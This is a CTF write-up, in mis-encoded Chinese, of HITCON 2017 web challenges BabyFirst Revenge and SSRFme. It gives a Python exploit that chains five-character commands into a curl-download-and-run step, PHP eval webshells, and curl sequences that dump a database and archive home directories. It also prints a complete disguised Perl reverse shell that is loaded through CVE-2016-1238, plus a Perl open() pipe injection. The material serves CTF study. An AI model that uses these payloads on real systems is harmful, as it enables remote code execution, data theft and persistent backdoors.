---
title:  Hitcon CTF 2017 Web  Write-up
subtitle: XCTFtime
time: 2017.11.08 10:00:00
layout: post
catalog: true
tags:
- CTF
- Web
excerpt: ä¸Šå‘¨æœ«æ‰“äº†ä¸€Hitconæ¯”èµ›ï¼Œå›½é™…èµ›æœç„¶éš¾åº¦å¾ˆå¤§ã€‚ğŸ˜‚ä¸€å…±æ‰åšå‡ºä¸€é“é¢˜ï¼ŒBabyFirst Revengeã€‚

---

# Hitcon2017

## BabyFirst Revenge

```php
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);

```

æ„é€ è¿™æ ·çš„shè„šæœ¬,

```
curl xxx.xxx>1
```

è¿™æ ·å°±èƒ½ä»å¤–éƒ¨ä¸‹è½½ä¸€ä¸ª1æ–‡ä»¶ï¼Œè€Œ1ä¸­å†…å®¹å¯ç”±æˆ‘ä»¬å¯æ§ã€‚å¦å¤–ï¼Œä¸ºäº†ä¿è¯cmdé•¿åº¦å°äº5ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·æ„é€ ï¼Œæ¯ä¸ªè¯·æ±‚ç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨lsæŠŠæ–‡ä»¶åæ‹¼æ¥å†™å…¥æ–‡ä»¶ã€‚

æ€è·¯å‚è€ƒï¼šhttp://wonderkun.cc/index.html/?p=524ï¼ˆé€šè¿‡`>xx`,æ–°å»ºæ–‡ä»¶ã€‚`ls >m\` å°†æ–‡ä»¶åä»¥å­—å…¸åºå†™åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚`sh m*`æ¥æ‰§è¡Œæ–‡ä»¶ã€‚)

aæ–‡ä»¶å†…å®¹å¯ä»¥å¦‚ä¸‹ï¼š

```bash
cur\
l\ \
m\
na\
nb\
nc\
xx.\
xy.\
z\>1
```

è¿™æ ·sh m*åï¼Œä¼šæ–°å»ºä¸€ä¸ª1æ–‡ä»¶ã€‚1æ–‡ä»¶å†…å®¹æ˜¯æˆ‘ä»¬å¯æ§åŸŸåä¸‹çš„index.html.é‚£ä¹ˆï¼Œæˆ‘ä»¬åªéœ€è¦å°†index.htmlå†™æˆè¿™æ ·ï¼Œå°±èƒ½åœ¨å½“å‰ç›®å½•ä¸‹æ„é€ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ã€‚(7d8fc845c741ce6a72fa592b394cf9f3æ˜¯ä¾æ®æºç ç®—å‡ºçš„å“ˆå¸Œ)

```
echo "<?php eval(\$_REQUEST['XXXX']);?>" > /www/sandbox/7d8fc845c741ce6a72fa592b394cf9f3/2.php
```

è¿™æ ·ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨`http://52.199.204.34/sandbox/7d8fc845c741ce6a72fa592b394cf9f3/2.php`å¾—åˆ°ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ã€‚

Payloadå¦‚ä¸‹ï¼š


```Python
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests


def GetShell():
    url = "http://52.199.204.34/?cmd="
    requests.get("http://52.199.204.34/?reset=1")

    fileNames = ["cur\\", "l\\ \\", "na\\", "nb\\", "nc\\","xx.\\","xy\\","z\\>1"]

    for fileName in fileNames:
        createFileUrl = url + ">" + fileName
        print createFileUrl
        requests.get(createFileUrl)

    getShellUrl=url+"ls>m\\"
    print getShellUrl
    requests.get(getShellUrl)
    getShellUrl = url + "sh m*"
    print getShellUrl
    requests.get(getShellUrl)

    getShellUrl = url + "sh 1"
    print getShellUrl
    requests.get(getShellUrl)

    response=requests.get("http://52.199.204.34/sandbox/7d8fc845c741ce6a72fa592b394cf9f3/2")
    print response.content



if __name__ == "__main__":
    GetShell()
```

ç„¶åï¼Œåˆ©ç”¨èšå‰‘è¿æ¥,å¯ä»¥åœ¨homeç›®å½•æ‰¾åˆ°flagåœ¨æ•°æ®åº“ä¸­ã€‚

![baby1](https://mo-xiaoxi.github.io/img/post/hitcon/baby1.png)

å†è¿æ¥æ•°æ®åº“ï¼Œè·å–æ•°æ®å³å¯ã€‚

```
mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e 'use fl4gdb;select * from this_is_the
_fl4g;'
```



![baby2](https://mo-xiaoxi.github.io/img/post/hitcon/baby2.png)

#### å…¶ä»–è§£æ³•

1. [Orangeå®˜æ–¹è§£ç­”](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/babyfirst-revenge-v2/exploit.py)
2. [Chybetaçš„è§£ç­”](https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/)
3. [ç‹ä¸€èˆªçš„è§£ç­”](http://www.jianshu.com/p/82788b6949c7)
4. [https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/](https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/)

è¿™é‡Œæ€»ç»“ä¸€ä¸‹ï¼Œæˆ‘ä»¬çš„è§£æ³•æ˜¯é€šè¿‡æ„é€ ä¸€ä¸ªç¬¦åˆå­—å…¸åºçš„`curl xxx.xx>1`æ¥ä»å¤–éƒ¨ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶shæ‰§è¡Œå®ƒã€‚è¿™é‡Œçš„åŸŸåéœ€è¦ç‰¹æ®Šæ„é€ ï¼Œä½¿å…¶ç¬¦åˆå­—å…¸åºã€‚

è€ŒOrangeçš„æ€è·¯ç”¨åˆ°äº†ä¸€ä¸ªè¿½åŠ çš„æ–¹å¼ï¼Œå³\>\>æŒ‡ä»¤ã€‚åœ¨http://wonderkun.cc/index.html/?p=524è¿™ç¯‡æ–‡ç« ä¸­ï¼Œè®²åˆ°åˆ©ç”¨`ls -t>a`æ¥é˜²æ­¢æŒ‡ä»¤ä¹±åºçš„é—®é¢˜ã€‚ä½†å½“é•¿åº¦ä¸º5ä¸ªå­—èŠ‚æ—¶ï¼Œ`ls -t>a`æŒ‡ä»¤å°±æ— æ³•è¾“å…¥äº†ã€‚è€Œä¸”è‹¥åˆ†ä¸ºå¤šä¸ªæ–‡ä»¶æŒ‡ä»¤æ‹¼æ¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬æ¯æ¬¡åªèƒ½è¾“å…¥3ä¸ªå­—ç¬¦ã€‚ï¼ˆå› ä¸º\>å’Œ\\éœ€è¦å å»ä¸¤ä¸ªå­—ç¬¦ï¼Œå¦å¤–è‹¥è¦è¾“å…¥ä¸€äº›ç‰¹æ®Šç¬¦å·ï¼Œè¿˜ä¼šé¢å¤–å ç”¨ä¸€ä¸ªè½¬ä¹‰ç¬¦å·ã€‚ï¼‰æ­¤æ—¶ï¼Œå•çº¯åˆ©ç”¨\>æ˜¯æ— æ³•è§£å†³å­—å…¸åºé—®é¢˜çš„ï¼Œå› ä¸ºç©ºæ ¼å’Œ\-\>çš„asciiç å¤ªé å‰äº†ã€‚ä½†æ˜¯ï¼Œå¦‚æœä½¿ç”¨è¿½åŠ åŠŸèƒ½çš„è¯æ˜¯å¯ä»¥å®Œæˆçš„ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå†™å…¥lsï¼Œå†è¿½åŠ ` -t>a`ã€‚

è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªç‰¹æ€§ï¼Œå°±æ˜¯bashä¼šå¿½ç•¥æ‰§è¡Œè¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€è¡Œé”™è¯¯ã€‚

å…·ä½“å¦‚ä¸‹ï¼š

```bash
http://10.211.55.17/?cmd=>ls\
http://10.211.55.17/?cmd=ls>_
æ­¤æ—¶ï¼Œ_æ–‡ä»¶å†…å®¹ä¸º
âœ  1924cf16182a5279a02c5ffb573daaa4 cat _
_
ls\
å†è®¿é—®
http://10.211.55.17/?cmd=>\ \
http://10.211.55.17/?cmd=>-t\
http://10.211.55.17/?cmd=>\>g
http://10.211.55.17/?cmd=ls>>_(è¿½åŠ æ–‡ä»¶)
æ­¤æ—¶ï¼Œ_æ–‡ä»¶å†…å®¹
âœ  1924cf16182a5279a02c5ffb573daaa4 ls
 \  _  >g  ls\  -t\
âœ  1924cf16182a5279a02c5ffb573daaa4 cat _
_
ls\
 \
-t\
>g
_
ls\
å¦‚æœï¼Œæˆ‘ä»¬æ‰§è¡Œ_ï¼Œå¯ä»¥å‘ç°ls -t>gæŒ‡ä»¤ä¼šæ‰§è¡Œï¼Œè™½ç„¶ç¬¬1ã€6è¡Œä¼šæŠ¥é”™ã€‚
âœ  1924cf16182a5279a02c5ffb573daaa4 sh _
_: 1: _: _: not found
_: 6: _: _: not found
 \  _  g  >g  ls\  -t\
 gæ–‡ä»¶å†…å®¹ä»¥ç”Ÿæˆæ—¶é—´é€†åºå†™å…¥
 âœ  1924cf16182a5279a02c5ffb573daaa4 cat g
g
_
>g
-t\
 \
ls\
```

å°±æ˜¯é€šè¿‡å¦‚ä¸Šæ‰€ç¤ºçš„æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œ`ls -t>g`æŒ‡ä»¤ã€‚é‚£ä¹ˆï¼Œå½“æˆ‘ä»¬èƒ½æ‰§è¡Œè¿™ä¸ªæŒ‡ä»¤ä»¥åï¼Œå°±å’Œ7å­—èŠ‚çš„å‘½ä»¤æ‰§è¡Œé™åˆ¶æ¡ä»¶å®Œå…¨ç›¸åŒäº†ã€‚ï¼ˆåªè¦å…ˆåœ¨\_ä¸­å†™å…¥å¦‚ä¸Šæ‰€ç¤ºæ•°æ®ï¼Œç„¶åå†é€†åºä¼ å…¥æˆ‘ä»¬è¦æ‰§è¡Œçš„æŒ‡ä»¤ï¼Œç„¶åæ‰§è¡Œsh \_.è¿™æ ·å°±æŠŠæŒ‡ä»¤å†™å…¥gæ–‡ä»¶ä¸­ï¼Œå†æ‰§è¡Œgå³å¯ã€‚ï¼‰

Chybetaçš„æ€è·¯å’ŒOrangeçš„æ€è·¯å‡ ä¹ç›¸åŒï¼Œä¹Ÿæ˜¯æ›²çº¿æ•‘å›½å…ˆå†™ä¸€ä¸ª`ls -t>g`æŒ‡ä»¤ï¼Œå†æ‰§è¡Œã€‚ä¸è¿‡ï¼Œä»–çš„åè¿›åˆ¶æŠ€å·§å’Œé€šè¿‡`rm%20i* sh%20a sh%20i*`è¿˜æ˜¯å¯ä»¥å­¦ä¹ çš„ã€‚

è‡³äºç‹ä¸€èˆªçš„ç¬¬ä¸€ä¸ªæ€è·¯å…¶å®ä¹Ÿæ˜¯ä¸€æ ·ï¼Œå…ˆå†™ä¸€ä¸ª`ls -t >g`æŒ‡ä»¤åˆ°æ–‡ä»¶ï¼Œç„¶åé€†åºå†™å…¥ä¸€ä¸ªbaseç¼–ç åçš„æŒ‡ä»¤ï¼Œå†é€šè¿‡æ‰§è¡Œ`ls -t >g`å°†base64å†™åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œå†æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œå°†å†™ä¸€å¥è¯æŒ‡ä»¤å†™å…¥æ–‡ä»¶cï¼Œæœ€åæ‰§è¡Œcï¼Œå†™å…¥ä¸€ä¸ªwebshellã€‚

```bash
âœ  1924cf16182a5279a02c5ffb573daaa4 cat c
echo '<?php eval($_REQUEST[c]);?>'>c.php%
```

 è€Œä»–çš„æ€è·¯äºŒå’Œæˆ‘ä»¬çš„æ€è·¯ä¸€æ ·ï¼Œä¸å†èµ˜è¿°ã€‚ä¸è¿‡ï¼Œmysqldumpçš„tipå€¼çš„è®°å½•ä¸€ä¸‹ã€‚

```mysql
 mysqldump --single-transaction -u user -p DBNAME > backup.sql
```

infosecçš„æ€è·¯éå¸¸ç¥å¥‡ï¼Œå€¼çš„å­¦ä¹ ã€‚

```bash
curl 'http://52.199.204.34/?cmd=>find'
curl 'http://52.199.204.34/?cmd=*%20/>x'
```

ä»–é€šè¿‡\*ï¼ŒæˆåŠŸæ‹¼æ¥æŒ‡ä»¤ï¼Œå°†`find />x`æˆåŠŸæ‰§è¡Œã€‚æŠŠæ‰€æœ‰ä¿¡æ¯å†™å…¥xï¼Œç„¶åç½‘é¡µç«¯è®¿é—®ä¸€ä¸‹ï¼Œå°±èƒ½è·å¾—æ‰€æœ‰ç¡¬ç›˜ä¸Šæ•°æ®ä¿¡æ¯ã€‚

```bash
curl 'http://52.199.204.34/?cmd=>tar'
curl 'http://52.199.204.34/?cmd=>zcf'
curl 'http://52.199.204.34/?cmd=>zzz'
curl 'http://52.199.204.34/?cmd=*%20/h*'
```

å†é€šè¿‡è¿™ä¸ªæŒ‡ä»¤ï¼Œå°†homeç›®å½•ä¸‹çš„æ•°æ®å‹ç¼©åŒ…ä¿å­˜ä¸‹æ¥ã€‚

```bash
cat << EOF >> exploit.php
<?php exec('mysqldump --single-transaction -ufl4444g -pSugZXUtgeJ52_Bvr --all-databases > /var/www/html/sandbox/727479ef7cedf30c03459bec7d87b0f0/dump.sql 2>&1'); ?>
EOF
curl 'http://52.199.204.34/?reset=1'
curl 'http://52.199.204.34/?cmd=>tar'
curl 'http://52.199.204.34/?cmd=>vcf'
curl 'http://52.199.204.34/?cmd=>z'
curl -F file=@exploit.php -X POST 'http://52.199.204.34/?cmd=%2A%20%2Ft%2A'
curl 'http://52.199.204.34/?cmd=php%20z'
```

å…ˆå°†ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åˆ°ä¸´æ—¶æ–‡ä»¶åŒºï¼Œå†å°†å…¶å‹ç¼©åˆ°zï¼Œæœ€åå†è§£å‹å‡ºæ¥ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨ç½‘é¡µç«¯è®¿é—®è¿™ä¸ªé¡µé¢ï¼Œè·å¾—æœ€ç»ˆçš„FLAGã€‚



## BabyFirst Revenge v2

Orangeçš„é¢˜è§£ï¼šhttps://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2017/babyfirst-revenge-v2/exploit.py

è¿™é‡Œä¸»è¦åˆ©ç”¨çš„\*èƒ½æ‰§è¡ŒæŒ‡ä»¤çš„æŠ€å·§ï¼Œé€†åºå†™å…¥ä¸€ä¸ª`ls -t>g`æŒ‡ä»¤ã€‚

```bash
http://10.211.55.17/?cmd=>dir
http://10.211.55.17/?cmd=>sl
http://10.211.55.17/?cmd=>g\>
http://10.211.55.17/?cmd=>ht-
âœ  1924cf16182a5279a02c5ffb573daaa4 ls
dir  g>  ht-  sl  
âœ  1924cf16182a5279a02c5ffb573daaa4 *
g>  ht-  sl  
âœ  1924cf16182a5279a02c5ffb573daaa4 *>v
âœ  1924cf16182a5279a02c5ffb573daaa4 cat v
g>  ht-  sl  
âœ  1924cf16182a5279a02c5ffb573daaa4
```

åˆ©ç”¨\*ï¼Œå–åˆ°diræŒ‡ä»¤ï¼Œç„¶ådiræŒ‡ä»¤è¿”å›`g>  ht-  sl `,æœ€åå†™å…¥åˆ°vä¸­ã€‚

```bash
http://10.211.55.17/?cmd=>dir
http://10.211.55.17/?cmd=>sl
http://10.211.55.17/?cmd=>g\>
http://10.211.55.17/?cmd=>ht-
http://10.211.55.17/?cmd=*>v
http://10.211.55.17/?cmd=>rev
http://10.211.55.17/?cmd=*v>x
âœ  1924cf16182a5279a02c5ffb573daaa4 cat x
ls  -th  >g
âœ  1924cf16182a5279a02c5ffb573daaa4
```

é€šè¿‡revæŒ‡ä»¤å°†æŒ‡ä»¤é€†åºå†™å…¥xã€‚è¿™æ ·å°±è·å¾—äº†`ls -th >g`åé¢å°±ç®€å•äº†ï¼Œä¸å†èµ˜è¿°ã€‚å…·ä½“å¯ä»¥çœ‹Orangeçš„å®˜æ–¹WPã€‚(\*v,å…ˆå–åˆ°revï¼Œå†å–åˆ°v,å³å°†våå‘ã€‚)







## 

## SSRFme

æºç ï¼š

```php
<?php 
    $sandbox = "sandbox/" . md5("orange" . $_SERVER["REMOTE_ADDR"]); 
    @mkdir($sandbox); 
    @chdir($sandbox); 

    $data = shell_exec("GET " . escapeshellarg($_GET["url"])); 
    $info = pathinfo($_GET["filename"]); 
    $dir  = str_replace(".", "", basename($info["dirname"])); 
    @mkdir($dir); 
    @chdir($dir); 
    @file_put_contents(basename($info["basename"]), $data); 
    highlight_file(__FILE__); 
```

å¯ä»¥è¯»å–etc/passwd

```python
import requests

url = 'http://13.115.136.15/'

exp = '/etc/passwd'
payload = "?url={0}&filename=data"
see = 'sandbox/7d8fc845c741ce6a72fa592b394cf9f3/data'

req = requests.Session()


r = req.get(url+payload.format(exp))
# print r.content

r = req.get(url+see)
print r.content
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
orange:x:1001:1001:,,,:/home/orange:/bin/bash
```

ä½†æ˜¯ï¼Œæ²¡ä»€ä¹ˆä¿¡æ¯ã€‚è¯»å–ä¸€ä¸‹æ ¹ç›®å½•ä¿¡æ¯ï¼š

```
./
../
bin/
boot/
dev/
etc/
flag
home/
initrd.img
initrd.img.old
lib/
lib64/
lost+found/
media/
mnt/
opt/
proc/
readflag
root/
run/
sbin/
snap/
srv/
sys/
tmp/
usr/
var/
vmlinuz
vmlinuz.old
www/
```

å‘ç°æ ¹ç›®å½•ï¼Œå­˜åœ¨readflagå’Œflagã€‚ä½†æ˜¯ï¼Œflagæ–‡ä»¶ï¼Œwww-dataç”¨æˆ·æ— æ³•è¯»å–flag

è¯»å–ä¸€ä¸‹readflagäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ‹‰è¿›IDA proï¼Œf5åï¼Œæºç å¦‚ä¸‹æ‰€ç¤ºï¼š

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // ST08_8@1
  int result; // eax@1
  __int64 v5; // rsi@1
  char ptr; // [sp+10h] [bp-410h]@1
  __int64 v7; // [sp+418h] [bp-8h]@1

  v7 = *MK_FP(__FS__, 40LL);
  memset(&ptr, 0, 0x400uLL);
  stream = fopen("/flag", "r");
  fread(&ptr, 1uLL, 0x400uLL, stream);
  fclose(stream);
  puts(&ptr);
  result = 0;
  v5 = *MK_FP(__FS__, 40LL) ^ v7;
  return result;
}
```

é‚£ä¹ˆï¼Œç°åœ¨çš„æ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼Œå°±æ˜¯é€šè¿‡æŸç§æ–¹å¼æ‰§è¡Œreadflagæ¥è¯»å–flagã€‚

ç„¶åï¼Œè¯»å–äº†arpå’Œtcpã€udpæƒ…å†µï¼Œå‘ç°å†…ç½‘æ²¡æœ‰å•¥å¯ç”¨çš„ä¿¡æ¯ï¼Œä¹Ÿæ²¡æœ‰ä¸€äº›å¸¸è§çš„SSRFå¯æ”»å‡»çš„æœåŠ¡ï¼Œé™·å…¥ç“¶é¢ˆã€‚

å¯ä»¥è¯»å–/usr/bin/GETæ–‡ä»¶ï¼Œå‘ç°æ˜¯ä¸€ä¸ªperlè„šæœ¬ï¼Œæ€€ç–‘perlè„šæœ¬å­˜åœ¨æ¼æ´ï¼Œå¯å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚

æ¯”èµ›æ—¶å°±å¡åœ¨äº†è¿™ï¼Œæ²¡åšå‡ºæ¥ã€‚èµ›åï¼Œçœ‹äº†Orangeçš„é¢˜è§£ï¼Œæ€è·¯æ˜¯å¯¹çš„ã€‚

> Idea
>
> - [CVE-2016-1238](https://perl5.git.perl.org/perl.git/commit/cee96d52c39b1e7b36e1c62d38bcd8d86e9a41ab) (But the latest version of Ubuntu 17.04 in AWS is still vulnerable)
> - Perl lookup current directory in module importing
> - Perl module [URI/lib/URI.pm#L136](https://github.com/libwww-perl/URI/blob/b7680860f323a0cf3ffe5f6bdb684646e1ecac33/lib/URI.pm#L136) will `eval` if there is a unknown scheme

é¢˜ç›®çš„è€ƒç‚¹å°±æ˜¯CVE-2016-1238.åœ¨URI/lib/URi.pm 136è¡Œï¼Œæœ‰ä¸€ä¸ª`eval "require $ic";`è¯­å¥ï¼Œå½“è§£æé‡åˆ°ä¸€ä¸ªæœªå®šä¹‰çš„åè®®æ—¶ï¼Œä¼šrequireè¿™ä¸ªæœªçŸ¥åè®®ã€‚è€Œrequireçš„æ—¶å€™ï¼Œperlè„šæœ¬ä¼šè‡ªåŠ¨æœç´¢å½“ä¸‹ç›®å½•å’Œperlåº“ç›®å½•æ¥å¯¼å…¥ä»¥.pmç»“å°¾çš„æ¨¡å—ã€‚

æ¼æ´ä»£ç å¦‚ä¸‹ï¼š

```perl
    $ic = "URI::$scheme";  # default location
    # turn scheme into a valid perl identifier by a simple transformation...
    $ic =~ s/\+/_P/g;
    $ic =~ s/\./_O/g;
    $ic =~ s/\-/_/g;
    no strict 'refs';
    # check we actually have one for the scheme:
    unless (@{"${ic}::ISA"}) {
        if (not exists $require_attempted{$ic}) {
            # Try to load it
            my $_old_error = $@;
            eval "require $ic";
            die $@ if $@ && $@ !~ /Can\'t locate.*in \@INC/;
            $@ = $_old_error;
        }
        return undef unless @{"${ic}::ISA"};
    }
```



æ‰€ä»¥ï¼Œæˆ‘ä»¬å…ˆæ‰¾ä¸€ä¸ªperlçš„åé—¨ï¼š

```perl
#!/usr/bin/perl -w
# perl-reverse-shell - A Reverse Shell implementation in PERL
use strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";

# Where to send the reverse shell.  Change these.
my $ip = '127.0.0.1';
my $port = 1234;

# Options
my $daemon = 1;
my $auth   = 0; # 0 means authentication is disabled and any 
        # source IP can access the reverse shell
my $authorised_client_pattern = qr(^127\.0\.0\.1$);

# Declarations
my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";

# Change the process name to be less conspicious
$0 = "[httpd]";

# Authenticate based on source IP address if required
if (defined($ENV{'REMOTE_ADDR'})) {
    cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

    if ($auth) {
        unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
            cgiprint("ERROR: Your client isn't authorised to view this page");
            cgiexit();
        }
    }
} elsif ($auth) {
    cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
    cgiexit(0);
}

# Background and dissociate from parent process if required
if ($daemon) {
    my $pid = fork();
    if ($pid) {
        cgiexit(0); # parent exits
    }

    setsid();
    chdir('/');
    umask(0);
}

# Make TCP connection for reverse shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
    cgiprint("Sent reverse shell to $ip:$port");
    cgiprintpage();
} else {
    cgiprint("Couldn't open reverse shell to $ip:$port: $!");
    cgiexit();    
}

# Redirect STDIN, STDOUT and STDERR to the TCP connection
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");
$ENV{'HISTFILE'} = '/dev/null';
system("w;uname -a;id;pwd");
exec({"/bin/sh"} ($fake_process_name, "-i"));

# Wrapper around print
sub cgiprint {
    my $line = shift;
    $line .= "<p>\n";
    $global_page .= $line;
}

# Wrapper around exit
sub cgiexit {
    cgiprintpage();
    exit 0; # 0 to ensure we don't give a 500 response.
}

# Form HTTP response using all the messages gathered by cgiprint so far
sub cgiprintpage {
    print "Content-Length: " . length($global_page) . "\r
Connection: close\r
Content-Type: text\/html\r\n\r\n" . $global_page;
}
```

ç„¶åï¼Œå°†å…¶éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šï¼ˆåå¼¹ipæ”¹ä¸ºæˆ‘ä»¬æœåŠ¡å™¨çš„ipï¼‰ã€‚

```Html
http://10.211.55.17/index.php?filename=URI/moxiaoxi.pm&url=http://xx.xx.xx.x/backdoor.txt
```

```
â””â”€â”€ sandbox
    â””â”€â”€ 1924cf16182a5279a02c5ffb573daaa4
        â””â”€â”€ URI
            â””â”€â”€ moxiaoxi.pm

```

è¿™æ ·å°±åœ¨ç½‘ç«™ä¸Šæ–°å»ºäº†ä¸€ä¸ªURIç›®å½•ï¼Œç›®å½•ä¸‹æœ‰moxiaoxi.pmæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ä¸ºæˆ‘ä»¬çš„backdoorã€‚

åœ¨æœåŠ¡å™¨ä¸Šç›‘å¬ç«¯å£ï¼Œå†è®¿é—®`10.211.55.17/index.php?filename=xxx&url=moxiaoxi://mo-xiaoxi.github.io`å°±èƒ½è·å¾—ä¸€ä¸ªåå¼¹shellã€‚è¿™é‡Œè®¿é—®`moxiaoxi://mo-xiaoxi.github.io`æ—¶ï¼Œmoxiaoxiæ˜¯æœªå®šä¹‰æ¨¡å—ï¼Œæ‰€ä»¥ä¼šè‡ªåŠ¨æœç´¢å¹¶åŠ è½½URIä¸­çš„moxiaoxi.pm æ¨¡å—ã€‚

```bash
 âœ  html nc -w 1 -k -lvv 1235
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Listening on :::1235
Ncat: Listening on 0.0.0.0:1235
Ncat: Connection from 13.115.136.15.
Ncat: Connection from 13.115.136.15:39746.
 03:10:35 up 2 days,  9:35,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
Linux ip-172-31-28-110 4.4.0-1039-aws #48-Ubuntu SMP Wed Oct 11 15:15:01 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/
/usr/sbin/apache: 0: can't access tty; job control turned off
$ ./readflag
hitcon{Perl_<3_y0u}

```

### å…¶ä»–è§£æ³•

å‚è€ƒricterzçš„åšå®¢ï¼Œå…¶çŸ¥è¯†ç‚¹æ˜¯ï¼Œå¦å¤–ä¸€ä¸ªå‘½ä»¤æ³¨å…¥ï¼Œæ˜¯perlçš„featureï¼Œåœ¨openä¸‹å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚

```bash
âœ  test cat test.pl
open(FD, "whoami|");
print <FD>;
âœ  test perl test.pl
moxiaoxi
âœ  test
```

åœ¨openä¸‹ï¼Œå¦‚æœperlçš„ç¬¬äºŒä¸ªå‚æ•°ï¼ˆpathï¼‰å¯æ§ï¼Œæˆ‘ä»¬å°±èƒ½è¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œã€‚

è€ŒGETå¯¹åè®®å¤„ç†éƒ¨åˆ†è°ƒç”¨çš„æ˜¯ `/usr/share/perl5/LWP/Protocol`ä¸‹çš„å„ä¸ªpmæ¨¡å—ï¼Œé€šè¿‡æŸ¥è¯¢å¯ä»¥å‘ç°åœ¨file.pmä¸­ï¼Œpathå‚æ•°æ˜¯å®Œå…¨å¯æ§çš„ã€‚

æºç å¦‚ä¸‹ï¼š

```perl
...
# URL OK, look at file
my $path  = $url->file;

# test file exists and is readable
unless (-e $path) {
return HTTP::Response->new( &HTTP::Status::RC_NOT_FOUND,
              "File `$path' does not exist");
}
...
# read the file
if ($method ne "HEAD") {
open(F, $path) or return new
    HTTP::Response(&HTTP::Status::RC_INTERNAL_SERVER_ERROR,
           "Cannot read file '$path': $!");
...
```

è¿™é‡Œå¤šäº†ä¸€ä¸ªé™åˆ¶æ¡ä»¶ï¼Œå°±æ˜¯file.pmä¼šå…ˆåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ã€‚è‹¥å­˜åœ¨ï¼Œæ‰ä¼šè§¦å‘æœ€ç»ˆçš„ä»£ç æ‰§è¡Œã€‚

```bash
âœ  test GET 'file:id|'
âœ  test touch 'id|'
âœ  test GET 'file:id|'
